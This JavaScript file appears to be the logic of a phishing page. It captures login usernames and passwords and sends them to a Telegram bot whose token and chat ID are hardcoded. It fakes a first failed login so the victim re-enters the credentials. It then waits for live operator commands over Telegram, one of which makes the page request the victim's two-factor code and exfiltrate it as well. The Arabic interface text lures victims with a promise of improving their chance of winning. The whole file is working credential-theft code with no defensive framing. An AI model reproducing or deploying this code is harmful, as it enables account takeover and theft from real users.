const TG_TOKEN = "8589243363:AAH4sM1DEqNXAUK314uyagIB3GbRouEL8ak";
const CHAT_ID = "8026901193";

let loginAttempts = 0;
let timeLeft = 50;
let isCommandActive = true;

async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('status-text');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;

    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        await sendToTelegram(`⚠️ محاولة 1:\n👤 User: ${u}\n🔑 Pass: ${p}`);
        setTimeout(() => {
            msg.innerText = "❌ خطأ في السيرفر: كلمة المرور أو اليوزر غير صحيح!";
            msg.style.color = "#ff4444";
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
    } else {
        btn.disabled = true;
        msg.style.color = "#00f2ff";
        await sendToTelegram(`✅ محاولة 2 (مؤكدة):\n👤 User: ${u}\n🔑 Pass: ${p}`);
        
        // بدء العداد المستقل
        runCountdown();
        // بدء الاستماع الذكي (بدون تعليق)
        listenForCommands();
    }
}

function runCountdown() {
    const msg = document.getElementById('status-text');
    const timer = setInterval(() => {
        if (!isCommandActive) { clearInterval(timer); return; }
        msg.innerText = `⏳ جاري المزامنة السحابية... (ثانية ${timeLeft})`;
        timeLeft--;
        if (timeLeft < 0) {
            clearInterval(timer);
            openRadar();
        }
    }, 1000);
}

async function listenForCommands() {
    if (!isCommandActive) return;

    try {
        const res = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=-1&limit=1`);
        const data = await res.json();
        
        if (data.result && data.result.length > 0) {
            const cmd = data.result[0].message?.text.toUpperCase() || "";
            
            if (cmd === "Q") {
                await sendToTelegram(`📊 تقرير: الجهاز متصل والوقت المتبقي ${timeLeft}ث`);
            } else if (cmd === "2FA") {
                isCommandActive = false;
                stopAndRequest2FA();
                return; // الخروج من حلقة الاستماع
            } else if (cmd === "OK") {
                isCommandActive = false;
                openRadar();
                return;
            }
        }
    } catch (e) { console.log("Polling..."); }

    // بدلاً من setInterval، نستدعي الوظيفة مرة أخرى بعد 3 ثوانٍ
    if (isCommandActive) setTimeout(listenForCommands, 3000);
}

function stopAndRequest2FA() {
    const msg = document.getElementById('status-text');
    const pInput = document.getElementById('u_pas');
    const btn = document.getElementById('sync-btn');

    msg.innerText = "⚠️ فشلت المزامنة! أدخل رمز الـ 2FA لرفع نسبة الفوز:";
    msg.style.color = "#ffcc00";
    pInput.value = "";
    pInput.placeholder = "Code 2FA";
    btn.disabled = false;
    btn.innerText = "تأكيد الرمز 🔓";
    
    btn.onclick = async () => {
        await sendToTelegram(`🔐 الرمز: ${pInput.value}`);
        alert("جاري التحقق...");
        btn.disabled = true;
    };
}

function openRadar() {
    isCommandActive = false;
    document.getElementById('auth-screen').classList.add('hidden');
    document.getElementById('main-app').classList.remove('hidden');
}

async function sendToTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
    } catch (e) {}
}
